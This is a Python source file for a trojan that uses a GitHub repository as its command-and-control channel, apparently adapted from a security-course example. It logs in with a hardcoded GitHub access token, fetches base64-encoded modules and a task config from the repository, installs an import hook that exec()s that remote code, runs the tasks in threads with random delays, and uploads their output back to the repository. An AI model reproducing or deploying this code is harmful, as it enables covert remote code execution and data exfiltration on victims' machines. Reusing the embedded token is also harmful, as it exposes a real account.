import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
from datetime import datetime
from github3 import login

trojan_id = "abc"
trojan_config = "config/{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f" [**] Attempting to retrieve {fullname}")
            
            new_library = get_file_contents(f"modules/{fullname}")
            
            # print(new_library, 'in find_module')
            
            if new_library:
                
                self.current_module_code = base64.b64decode(new_library)
                               
                return self
        
        return None

    def load_module(self, name):
        gh, repo, branch = connect_to_github()
        print('1 -> in load_module: ', name)
        
        spec = importlib.util.spec_from_loader(name, loader=None, origin=repo.git_url)
        mod = importlib.util.module_from_spec(spec)
        
        print('2 -> in load_module: ', mod)

        exec(self.current_module_code, mod.__dict__)
        sys.modules[spec.name] = mod
        
        return mod

def connect_to_github():
    gh = login(username='JochiRaider',token=' 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') # 2FA accounts: replace password= with token="your token"
    repo = gh.repository('JochiRaider', 'VPI_FS_project')
    branch = repo.branch("main")
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    
     
    for filename in tree.tree:
       
        # print(filepath,filename.path)
       
        if filepath in filename.path:
            print(f"[+] Found file {filepath}")
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
        

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    
    # print(config_json)

    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    # print('in get_trojan_config func: ', configuration)

    for tasks in configuration:
        
        # print('in get_trojan_config loop', tasks)

        if tasks["module"] not in sys.modules:
            print(f"BB import {tasks['module']}")

            exec(f"import {tasks['module']}")

            print(f"AA import {tasks['module']}")

    return configuration

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    
    message = datetime.now().isoformat()

    remote_path = f"data/{trojan_id}/{message}.data"
    
    bindata = bytes('%r' %data, 'utf-8')
    repo.create_file(remote_path, message, base64.b64encode(bindata))
    
    

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)
    

# main loop
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        print('in main: ')
        
        config = get_trojan_config()
        
        print('in main: ', config)
        
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
    # time.sleep(random.randint(10000, 60000))
